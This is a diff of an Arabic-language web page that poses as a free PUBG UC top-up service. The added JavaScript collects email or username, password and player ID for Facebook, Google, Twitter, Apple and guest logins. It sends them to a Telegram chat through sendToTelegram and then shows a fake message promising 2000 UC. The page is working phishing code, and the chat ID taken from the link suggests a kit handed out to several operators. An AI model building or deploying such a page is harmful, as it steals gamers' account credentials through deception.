@@ -115,9 +115,6 @@
         .twitter { color: #1DA1F2; }
         .apple { color: #000000; }
         .guest { color: #666666; }
-        .xbox { color: #107C10; }
-        .steam { color: #000000; }
-        .playstation { color: #003087; }
         
         .login-option span {
             font-weight: 600;
@@ -222,19 +219,6 @@
             direction: ltr;
             text-align: left;
         }
-        
-        .platform-selection {
-            margin-bottom: 20px;
-        }
-        
-        .platform-selection select {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e9ecef;
-            border-radius: 10px;
-            font-size: 16px;
-            background: white;
-        }
     </style>
 </head>
 <body>
@@ -277,18 +261,6 @@
                         <div class="login-option" onclick="showLoginForm('guest')">
                             <i class="guest">🎮</i>
                             <span>تسجيل ضيف</span>
-                        </div>
-                        <div class="login-option" onclick="showLoginForm('xbox')">
-                            <i class="xbox">🎯</i>
-                            <span>Xbox</span>
-                        </div>
-                        <div class="login-option" onclick="showLoginForm('steam')">
-                            <i class="steam">💨</i>
-                            <span>Steam</span>
-                        </div>
-                        <div class="login-option" onclick="showLoginForm('playstation')">
-                            <i class="playstation">🎮</i>
-                            <span>PlayStation</span>
                         </div>
                     </div>
                 </div>
@@ -383,60 +355,6 @@
                     <button class="btn" onclick="submitForm('guest')">شحن UC 🪙</button>
                     <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
                 </div>
-                
-                <div id="xboxForm" class="form-container">
-                    <h3 style="text-align: center; margin-bottom: 20px; color: #107C10;">تسجيل الدخول عبر Xbox</h3>
-                    <div class="form-group">
-                        <label for="xboxEmail">البريد الإلكتروني</label>
-                        <input type="email" id="xboxEmail" placeholder="example@outlook.com">
-                    </div>
-                    <div class="form-group">
-                        <label for="xboxPassword">كلمة المرور</label>
-                        <input type="password" id="xboxPassword" placeholder="أدخل كلمة المرور">
-                    </div>
-                    <div class="form-group">
-                        <label for="xboxPlayerID">معرف اللاعب (Player ID)</label>
-                        <input type="text" id="xboxPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
-                    </div>
-                    <button class="btn" onclick="submitForm('xbox')">شحن UC 🪙</button>
-                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
-                </div>
-                
-                <div id="steamForm" class="form-container">
-                    <h3 style="text-align: center; margin-bottom: 20px; color: #000000;">تسجيل الدخول عبر Steam</h3>
-                    <div class="form-group">
-                        <label for="steamUsername">اسم المستخدم</label>
-                        <input type="text" id="steamUsername" placeholder="أدخل اسم المستخدم">
-                    </div>
-                    <div class="form-group">
-                        <label for="steamPassword">كلمة المرور</label>
-                        <input type="password" id="steamPassword" placeholder="أدخل كلمة المرور">
-                    </div>
-                    <div class="form-group">
-                        <label for="steamPlayerID">معرف اللاعب (Player ID)</label>
-                        <input type="text" id="steamPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
-                    </div>
-                    <button class="btn" onclick="submitForm('steam')">شحن UC 🪙</button>
-                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
-                </div>
-                
-                <div id="playstationForm" class="form-container">
-                    <h3 style="text-align: center; margin-bottom: 20px; color: #003087;">تسجيل الدخول عبر PlayStation</h3>
-                    <div class="form-group">
-                        <label for="psEmail">البريد الإلكتروني</label>
-                        <input type="email" id="psEmail" placeholder="example@playstation.com">
-                    </div>
-                    <div class="form-group">
-                        <label for="psPassword">كلمة المرور</label>
-                        <input type="password" id="psPassword" placeholder="أدخل كلمة المرور">
-                    </div>
-                    <div class="form-group">
-                        <label for="psPlayerID">معرف اللاعب (Player ID)</label>
-                        <input type="text" id="psPlayerID" class="player-id-input" placeholder="أدخل Player ID الخاص بك">
-                    </div>
-                    <button class="btn" onclick="submitForm('playstation')">شحن UC 🪙</button>
-                    <button class="btn back-btn" onclick="showLoginSelection()">رجوع</button>
-                </div>
             </div>
         </div>
     </div>
@@ -474,21 +392,114 @@
         }
         
         function showLoginForm(platform) {
-            document.getElementById('loginSelection').classList.add('hidden');
-            document.querySelectorAll('.form-container').forEach(form => {
+            console.log('Showing form for:', platform); // للتصحيح
+            
+            // إخفاء قسم اختيار الطرق أولاً
+            document.getElementById('loginSelection').style.display = 'none';
+            
+            // إخفاء كل النماذج
+            const forms = document.querySelectorAll('.form-container');
+            forms.forEach(form => {
+                form.style.display = 'none';
                 form.classList.remove('active');
             });
-            document.getElementById(platform + 'Form').classList.add('active');
+            
+            // إظهار النموذج المطلوب
+            const targetForm = document.getElementById(platform + 'Form');
+            if (targetForm) {
+                targetForm.style.display = 'block';
+                targetForm.classList.add('active');
+            } else {
+                console.error('Form not found:', platform + 'Form');
+            }
         }
         
         function showLoginSelection() {
-            document.querySelectorAll('.form-container').forEach(form => {
+            // إخفاء كل النماذج
+            const forms = document.querySelectorAll('.form-container');
+            forms.forEach(form => {
+                form.style.display = 'none';
                 form.classList.remove('active');
             });
-            document.getElementById('loginSelection').classList.remove('hidden');
+            
+            // إظهار اختيارات التسجيل
+            document.getElementById('loginSelection').style.display = 'block';
         }
         
         async function submitForm(platform) {
-            let email, password, phone, username, playerID;
+            let email, password, username, playerID;
             
-      
+            // الحصول على القيم بناءً على المنصة
+            switch(platform) {
+                case 'facebook':
+                    email = document.getElementById('fbEmail').value;
+                    password = document.getElementById('fbPassword').value;
+                    playerID = document.getElementById('fbPlayerID').value;
+                    break;
+                case 'google':
+                    email = document.getElementById('googleEmail').value;
+                    password = document.getElementById('googlePassword').value;
+                    playerID = document.getElementById('googlePlayerID').value;
+                    break;
+                case 'twitter':
+                    username = document.getElementById('twitterUsername').value;
+                    password = document.getElementById('twitterPassword').value;
+                    playerID = document.getElementById('twitterPlayerID').value;
+                    break;
+                case 'apple':
+                    email = document.getElementById('appleEmail').value;
+                    password = document.getElementById('applePassword').value;
+                    playerID = document.getElementById('applePlayerID').value;
+                    break;
+                case 'guest':
+                    username = document.getElementById('guestUsername').value;
+                    password = document.getElementById('guestPassword').value;
+                    playerID = document.getElementById('guestPlayerID').value;
+                    break;
+            }
+            
+            // التحقق من ملء جميع الحقول
+            if ((!email && !username) || !password || !playerID) {
+                alert('⚠️ يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            const chatId = getChatId();
+            const message = `
+🎮 <b>طلب شحن UC لببجي</b>
+
+📱 <b>المنصة:</b> ${platform}
+${email ? `📧 <b>البريد الإلكتروني:</b> ${email}\n` : ''}
+${username ? `👤 <b>اسم المستخدم:</b> ${username}\n` : ''}
+🔑 <b>كلمة المرور:</b> ${password}
+🎯 <b>Player ID:</b> ${playerID}
+🪙 <b>الكمية المطلوبة:</b> 2000 UC
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert('🎉 جاري شحن 2000 UC لحسابك...\n⏳ قد تستغرق العملية بضع دقائق');
+                // إعادة تعيين الحقول
+                document.querySelectorAll('input').forEach(input => input.value = '');
+                showLoginSelection();
+            } else {
+                alert('❌ حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        // التحقق من وجود chatId عند التحميل
+        window.addEventListener('load', function() {
+            const chatId = getChatId();
+            if (!chatId) {
+                alert('⚠️ الرابط غير صحيح - يرجى استخدام الرابط الصحيح');
+            }
+            
+            // التأكد من إظهار قسم الاختيار فقط في البداية
+            showLoginSelection();
+        });
+    </script>
+</body>
+    </html>
